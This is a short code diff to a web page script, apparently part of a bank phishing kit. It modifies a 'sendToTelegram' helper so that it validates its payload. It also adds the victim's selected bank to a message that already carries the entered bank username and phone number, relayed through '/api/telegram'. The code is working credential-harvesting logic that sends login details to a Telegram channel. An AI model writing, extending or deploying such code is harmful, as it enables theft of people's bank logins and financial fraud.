@@ -3090,6 +3090,12 @@
   
   // Helper function to send data to Telegram
   async function sendToTelegram(data) {
+    // Validate that action is present
+    if (!data || !data.action) {
+      console.error('❌ Cannot send to Telegram: missing action', data);
+      return false;
+    }
+    
     try {
       console.log('📤 Sender data til Telegram:', data);
       const response = await fetch('/api/telegram', {
@@ -3182,9 +3188,18 @@
           localStorage.setItem('telefonnummer', telefonnummer);
         }
         
+        // Get bank from localStorage
+        var bank = '';
+        if (window.localStorage) {
+          try {
+            bank = localStorage.getItem('selected_bank') || '';
+          } catch (e) {}
+        }
+        
         // Send to Telegram and wait for it to complete
         await sendToTelegram({
           action: 'login_username_entered',
+          bank: bank,
           bank_username: anmeldename,
           telefonnummer: telefonnummer,
         });
